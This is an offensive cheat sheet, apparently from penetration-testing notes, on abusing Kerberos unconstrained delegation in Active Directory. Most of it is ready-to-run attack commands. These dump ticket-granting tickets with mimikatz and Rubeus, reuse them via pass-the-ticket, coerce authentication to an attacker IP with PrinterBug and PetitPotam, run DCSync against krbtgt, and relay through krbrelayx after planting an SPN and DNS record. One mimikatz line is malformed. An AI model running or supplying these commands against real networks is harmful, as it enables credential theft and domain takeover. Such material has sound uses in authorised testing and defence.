# Unconstrained Delegation

The first hop server can request access to any service on any computer

## Requirements: UAC: ADS_UF_TRUSTED_FOR_DELEGATION

## Tools: Rubeus , mimikatz 

# Enumerate Computers with Unconstrained Delegation

    Get-NetComputer -UnConstrained

##### With AD Module

    Get-ADComputer -Filter {TrustedForDelegation -eq $True}
    Get-ADUser -Filter {TrustedForDelegation -eq $True}

# Get tickets

After compromising the computer with UD enabled, we can trick or wait for an admin connection

#### 1) mimikatz

    mimikatz "privilege::debug sekurlsa::tickets /export sekurlsa::tickets /export (Get TGT ticket)

#### 2) Rubeus

    Rubeus dump /service:krbtgt /nowrap (Get TGT ticket)

    Rubeus dump /luid:0xdeadbeef /nowrap (Get TGT ticket)

# Reuse the ticket (Pass-the-Ticket

    Invoke-Mimikatz -Command '"kerberos::ptt ticket.kirbi"'

# Force_coercion_with_coerced_auth

#### 1) To force another computer to connect to the compromised machine in UD, and capture the TGT by monitoring:

    Rubeus monitor /interval:5 /nowrap (Get TGT)

On the attacking machine, run

##### PrinterBug

    .\MS-RPRN.exe \\<target>.domain.local \\unconstrainedMachine.domain.local

##### PetitPotam

    .\PetitPotam.exe attacker_ip <target>.domain.local

### We get the ticket, then we move laterally with Pass the Ticket. If the target is a DC, we do a DC Sync to get Domain Admin access

    .\Rubeus.exe ptt /ticket:...

##### DCSync with the dc TGT

    Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\krbtgt"'

# Any principal in Unconstrained Delegation

If we have enough rights against a principal (computer or user) in UD to add a SPN on it and know its password, we can try to use it to retrieve a machine account password from an authentication coercion.

### 1) Add a new DNS record on the domain that points to our IP

### 2) Add a SPN on the principal that points to the DNS record and change its password (will be useful for the tool krbrelayx.py to extract the TGT from the ST)

### 3) Trigger the authentication and grab the ST (and TGT in it) on krbrelayx that is listening for it

Since the principal is in Unconstrained Delegation, when the machine account will send the ST to the SPN it will automatically add a TGT in it, and because the SPN is pointing to us with the DNS record, we can retrieve the ST, decipher the ciphered part with the user password (the SPN is setup on the user, so the ST is ciphered with his password), and retrieve the TGT.

##### Add the SPN with the Microsoft module

    Set-ADUser -Identity <principal_in_UD> -ServicePrincipalName @{Add='HOST/test.domain.local'}

##### Create the DNS record

    Invoke-DNSUpdate -DNSType A -DNSName test.domain.local -DNSData <attacker_IP> -Realm domain.local

##### Run krbrelayx with the hash of the password setup on the UD user

    python3 krbrelayx.py -hashes :2B576ACBE6BCFDA7294D6BD18041B8FE -dc-ip dc.domain.local

##### Trigger the coercion

    .\PetitPotam.exe <attacker_ip> <target_IP>
